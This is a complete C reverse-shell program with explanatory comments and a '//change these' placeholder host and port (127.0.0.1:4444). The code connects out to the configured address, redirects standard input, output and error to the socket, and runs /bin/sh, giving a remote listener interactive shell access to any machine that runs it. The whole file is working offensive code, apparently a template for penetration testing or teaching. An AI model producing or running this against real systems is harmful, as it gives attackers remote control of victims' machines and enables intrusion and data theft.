#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>


//change these
#define HOST "127.0.0.1"
#define PORT 4444


int main() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0); //open a socket file descriptor
    if (sockfd == -1) { //check for errors
        perror("socket");
        exit(1);
    }

    struct sockaddr_in address; //create structure variable address
    address.sin_family = AF_INET; //specify 'communication domain' for communication between different hosts using ipv4
    address.sin_port = htons(PORT); //specify the port
    address.sin_addr.s_addr = inet_addr(HOST); //specify host address
    if (connect(sockfd, (struct sockaddr *) &address, sizeof(address)) == -1) { //open a connection to the socket file descriptor sockfd
        perror("connect");
        exit(1);
    }

    dup2(sockfd, 0); //redirect standard input to the socket
    dup2(sockfd, 1); //redirect standard output to the socket
    dup2(sockfd, 2); //redirect standard error to the socket

    char *argv[] = {"/bin/sh", NULL}; //pass command-line arguments, the first argument should be the name of the program itself
    if (execve("/bin/sh", argv, NULL) == -1) { //execute the shell
        perror("execve");
        exit(1);
    }
    return 0; //exit (success)
}
